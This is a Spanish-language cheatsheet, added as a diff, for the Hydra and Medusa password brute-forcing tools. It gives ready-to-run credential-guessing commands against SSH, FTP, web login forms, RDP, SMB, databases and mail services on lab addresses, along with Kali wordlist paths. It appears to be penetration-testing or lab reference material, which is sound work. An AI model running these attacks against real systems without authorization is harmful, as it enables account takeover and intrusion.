@@ -1,0 +1,127 @@
+================================================================================
+                         HYDRA - CHEATSHEET
+			 Autor: D1n0
+================================================================================
+
+--- SINTAXIS BASE ---
+
+hydra [opciones] <IP> <protocolo>
+
+hydra -l usuario -p password 192.168.1.10 ssh
+hydra -l admin -P /ruta/wordlist.txt 192.168.1.10 ftp
+
+
+--- FLAGS PRINCIPALES ---
+
+-l usuario          # Usuario único
+-L lista.txt        # Lista de usuarios
+-p password         # Password único
+-P wordlist.txt     # Wordlist de passwords
+-u                  # Iterar por usuario primero (en vez de por pass)
+-t 4                # Threads (default 16, bajar si hay problemas)
+-T 64               # Threads globales totales
+-s PUERTO           # Puerto personalizado
+-S                  # SSL
+-v                  # Verbose
+-V                  # Verbose mostrando cada intento
+-o output.txt       # Guardar resultados
+-f                  # Parar al encontrar primer resultado válido
+-F                  # Parar en cualquier host al encontrar resultado
+-e nsr              # Pruebas extra: n=null, s=user=pass, r=reverse
+
+
+--- PROTOCOLOS COMUNES ---
+
+# SSH
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
+hydra -L users.txt -P rockyou.txt 192.168.1.10 ssh -t 4
+
+# FTP
+hydra -l admin -P rockyou.txt 192.168.1.10 ftp
+
+# HTTP Basic Auth
+hydra -l admin -P rockyou.txt 192.168.1.10 http-get /admin/
+
+# HTTP POST Form (login web)
+hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+
+# HTTPS POST Form
+hydra -l admin -P rockyou.txt -s 443 192.168.1.10 https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+
+# RDP
+hydra -l administrator -P rockyou.txt 192.168.1.10 rdp
+
+# SMB
+hydra -l administrator -P rockyou.txt 192.168.1.10 smb
+
+# Telnet
+hydra -l root -P rockyou.txt 192.168.1.10 telnet
+
+# MySQL
+hydra -l root -P rockyou.txt 192.168.1.10 mysql
+
+# PostgreSQL
+hydra -l postgres -P rockyou.txt 192.168.1.10 postgres
+
+# SMTP
+hydra -l user@dominio.com -P rockyou.txt 192.168.1.10 smtp
+
+# POP3
+hydra -l usuario -P rockyou.txt 192.168.1.10 pop3
+
+# IMAP
+hydra -l usuario -P rockyou.txt 192.168.1.10 imap
+
+# VNC (sin usuario)
+hydra -P rockyou.txt 192.168.1.10 vnc
+
+
+--- HTTP POST FORM - ESTRUCTURA IMPORTANTE ---
+
+# Formato: "/ruta:parametros_POST:string_fallo"
+# ^USER^ y ^PASS^ son los marcadores de hydra
+
+# Identificar string de fallo: el texto que aparece cuando el login falla
+# Ejemplos comunes: "Invalid", "incorrect", "failed", "error", "denied"
+
+# Ejemplo DVWA
+hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
+  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+
+# Con cookie de sesión
+hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
+  "/login:user=^USER^&pass=^PASS^:F=error:H=Cookie: PHPSESSID=abcd1234"
+
+
+--- WORDLISTS ÚTILES EN KALI ---
+
+/usr/share/wordlists/rockyou.txt          # La más usada (passwords)
+/usr/share/wordlists/metasploit/          # Colección variada
+/usr/share/seclists/Passwords/            # SecLists (si instalado)
+/usr/share/seclists/Usernames/            # Listas de usuarios
+
+# Descomprimir rockyou si está comprimido
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+
+--- COMBOS ÚTILES ---
+
+# SSH con verbose y parar al encontrar
+hydra -l root -P rockyou.txt -t 4 -f -v 192.168.1.10 ssh
+
+# Probar user=pass + null + reverse también
+hydra -L users.txt -P rockyou.txt -e nsr 192.168.1.10 ssh
+
+# Guardar resultado
+hydra -l admin -P rockyou.txt 192.168.1.10 ftp -o resultados_hydra.txt
+
+# FTP con puerto personalizado
+hydra -l admin -P rockyou.txt -s 2121 192.168.1.10 ftp
+
+
+--- MEDUSA (alternativa a hydra) ---
+
+medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh
+medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ftp -t 4
+
+================================================================================
